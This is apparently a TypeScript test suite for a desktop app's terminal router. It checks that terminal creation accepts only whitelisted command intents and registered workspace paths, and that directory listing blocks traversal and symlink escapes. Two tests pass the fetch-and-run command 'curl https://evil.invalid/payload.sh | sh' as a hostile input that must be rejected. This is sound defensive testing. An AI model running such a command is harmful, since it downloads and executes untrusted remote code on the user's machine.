import { afterEach, beforeEach, describe, expect, mock, test } from "bun:test"
import { mkdir, mkdtemp, rm, symlink, writeFile } from "node:fs/promises"
import { tmpdir } from "node:os"
import { basename, join, resolve } from "node:path"
import * as schema from "../src/main/lib/db/schema"
import { createAgentJobTestDb } from "./helpers/agent-job-test-db"

const tempDirs: string[] = []
const createCalls: unknown[] = []
let testDb = createAgentJobTestDb()

mock.module("../src/main/lib/db", () => ({
  ...schema,
  getDatabase: () => testDb,
}))

mock.module("../src/main/lib/terminal/manager", () => ({
  terminalManager: {
    createOrAttach: async (params: unknown) => {
      createCalls.push(params)
      return { isNew: true, serializedState: "" }
    },
    write: () => {},
    resize: () => {},
    signal: () => {},
    kill: async () => {},
    detach: () => {},
    clearScrollback: () => {},
    getSession: () => null,
    getSessionCountByWorkspaceId: () => 0,
    getSessionsByScopeKey: () => [],
    on: () => {},
    off: () => {},
  },
}))

const { terminalRouter } = await import("../src/main/lib/trpc/routers/terminal")

async function makeTempDir(prefix: string): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), prefix))
  tempDirs.push(dir)
  return resolve(dir)
}

function seedChat(input: {
  projectPath: string
  chatId?: string
  worktreePath?: string
  branch?: string | null
}) {
  const chatId = input.chatId ?? "chat-terminal-boundary"
  testDb
    .insert(schema.projects)
    .values({
      id: `project-${chatId}`,
      name: "Terminal Boundary",
      path: input.projectPath,
    })
    .run()

  testDb
    .insert(schema.chats)
    .values({
      id: chatId,
      projectId: `project-${chatId}`,
      name: "Terminal Boundary Chat",
      worktreePath: input.worktreePath ?? input.projectPath,
      branch: input.branch ?? null,
    })
    .run()

  return chatId
}

function seedFolderlessChat(chatId = "chat-terminal-folderless-boundary") {
  testDb
    .insert(schema.chats)
    .values({
      id: chatId,
      projectId: null,
      name: "Folderless Terminal Boundary Chat",
      worktreePath: null,
      branch: null,
    })
    .run()

  return chatId
}

beforeEach(() => {
  testDb = createAgentJobTestDb()
  createCalls.length = 0
})

afterEach(async () => {
  await Promise.all(
    tempDirs.splice(0).map((dir) => rm(dir, { recursive: true, force: true })),
  )
})

describe("terminal createOrAttach input boundary", () => {
  test("resolves cwd from the registered workspace and maps only whitelisted initial command intents", async () => {
    const projectPath = await makeTempDir("locus-terminal-project-")
    const chatId = seedChat({ projectPath })
    const scopeKey = `path:${projectPath}`
    const paneId = `${scopeKey}:term:githubauth`

    const caller = terminalRouter.createCaller({ getWindow: () => null })
    await expect(
      caller.createOrAttach({
        paneId,
        workspaceId: chatId,
        scopeKey,
        cols: 120,
        rows: 30,
        initialCommandIntents: ["github-cli-auth-login"],
      }),
    ).resolves.toMatchObject({ paneId, isNew: true })

    expect(createCalls).toHaveLength(1)
    expect(createCalls[0]).toMatchObject({
      paneId,
      workspaceId: chatId,
      scopeKey,
      cwd: projectPath,
      initialCommands: ["gh auth login"],
    })
  })

  test("rejects forged cwd and raw initialCommands from the previous XSS payload shape", async () => {
    const projectPath = await makeTempDir("locus-terminal-xss-project-")
    const chatId = seedChat({ projectPath })
    const scopeKey = `path:${projectPath}`

    const caller = terminalRouter.createCaller({ getWindow: () => null })
    await expect(
      caller.createOrAttach({
        paneId: `${scopeKey}:term:xss`,
        workspaceId: chatId,
        scopeKey,
        cwd: "/tmp",
        initialCommands: ["curl https://evil.invalid/payload.sh | sh"],
      } as never),
    ).rejects.toThrow()

    expect(createCalls).toHaveLength(0)
  })

  test("rejects forged terminal scope paths even when the workspace id is valid", async () => {
    const projectPath = await makeTempDir("locus-terminal-valid-project-")
    const forgedPath = await makeTempDir("locus-terminal-forged-project-")
    const chatId = seedChat({ projectPath })
    const forgedScopeKey = `path:${forgedPath}`

    const caller = terminalRouter.createCaller({ getWindow: () => null })
    await expect(
      caller.createOrAttach({
        paneId: `${forgedScopeKey}:term:spoofed`,
        workspaceId: chatId,
        scopeKey: forgedScopeKey,
      }),
    ).rejects.toThrow("Terminal scope does not match registered workspace")

    expect(createCalls).toHaveLength(0)
  })

  test("rejects arbitrary command strings masquerading as initial command intents", async () => {
    const projectPath = await makeTempDir("locus-terminal-intent-project-")
    const chatId = seedChat({ projectPath })
    const scopeKey = `path:${projectPath}`

    const caller = terminalRouter.createCaller({ getWindow: () => null })
    await expect(
      caller.createOrAttach({
        paneId: `${scopeKey}:term:badintent`,
        workspaceId: chatId,
        scopeKey,
        initialCommandIntents: ["curl https://evil.invalid/payload.sh | sh"],
      } as never),
    ).rejects.toThrow()

    expect(createCalls).toHaveLength(0)
  })

  test("rejects folderless chats without terminal filesystem context", async () => {
    const chatId = seedFolderlessChat()
    const scopeKey = `ws:${chatId}`

    const caller = terminalRouter.createCaller({ getWindow: () => null })
    await expect(
      caller.createOrAttach({
        paneId: `${scopeKey}:term:folderless`,
        workspaceId: chatId,
        scopeKey,
      }),
    ).rejects.toThrow("Terminal workspace is not registered")

    expect(createCalls).toHaveLength(0)
  })
})

describe("terminal listDirectory input boundary", () => {
  test("lists directories only inside the registered chat root", async () => {
    const projectPath = await makeTempDir("locus-terminal-list-project-")
    const chatId = seedChat({ projectPath })
    await mkdir(join(projectPath, "src"), { recursive: true })
    await writeFile(join(projectPath, "README.md"), "readme", "utf-8")
    await writeFile(join(projectPath, ".secret"), "hidden", "utf-8")

    const caller = terminalRouter.createCaller({ getWindow: () => null })
    const result = await caller.listDirectory({ chatId, dirPath: projectPath })

    expect(result).toMatchObject({
      currentPath: projectPath,
      parentPath: null,
    })
    expect(result.items.map((item) => item.name)).toEqual(["src", "README.md"])
  })

  test("rejects absolute paths outside the registered chat root", async () => {
    const projectPath = await makeTempDir("locus-terminal-list-root-")
    const outsidePath = await makeTempDir("locus-terminal-list-outside-")
    const chatId = seedChat({ projectPath })

    const caller = terminalRouter.createCaller({ getWindow: () => null })
    await expect(
      caller.listDirectory({ chatId, dirPath: outsidePath }),
    ).rejects.toThrow("Path escapes allowed directory")
  })

  test("rejects traversal paths that leave the registered chat root", async () => {
    const projectPath = await makeTempDir("locus-terminal-list-traversal-")
    const outsidePath = await makeTempDir(
      "locus-terminal-list-traversal-outside-",
    )
    const chatId = seedChat({ projectPath })
    const traversalPath = `${projectPath}/../${basename(outsidePath)}`

    const caller = terminalRouter.createCaller({ getWindow: () => null })
    await expect(
      caller.listDirectory({ chatId, dirPath: traversalPath }),
    ).rejects.toThrow("Path traversal not allowed")
  })

  test("rejects symlink escapes outside the registered chat root", async () => {
    const projectPath = await makeTempDir("locus-terminal-list-symlink-")
    const outsidePath = await makeTempDir(
      "locus-terminal-list-symlink-outside-",
    )
    const symlinkPath = join(projectPath, "outside-link")
    const chatId = seedChat({ projectPath })
    await symlink(outsidePath, symlinkPath)

    const caller = terminalRouter.createCaller({ getWindow: () => null })
    await expect(
      caller.listDirectory({ chatId, dirPath: symlinkPath }),
    ).rejects.toThrow("Path escapes allowed directory")
  })

  test("rejects unknown chat ids before reading directories", async () => {
    const projectPath = await makeTempDir("locus-terminal-list-unknown-chat-")

    const caller = terminalRouter.createCaller({ getWindow: () => null })
    await expect(
      caller.listDirectory({ chatId: "missing-chat", dirPath: projectPath }),
    ).rejects.toThrow("Chat worktree root is not registered")
  })

  test("rejects folderless chats without a registered worktree root", async () => {
    const scratchPath = await makeTempDir("locus-terminal-list-folderless-")
    const chatId = seedFolderlessChat("chat-terminal-folderless-list")
    await writeFile(join(scratchPath, "artifact.json"), "{}", "utf-8")

    const caller = terminalRouter.createCaller({ getWindow: () => null })
    await expect(
      caller.listDirectory({ chatId, dirPath: scratchPath }),
    ).rejects.toThrow("Chat worktree root is not registered")
  })
})
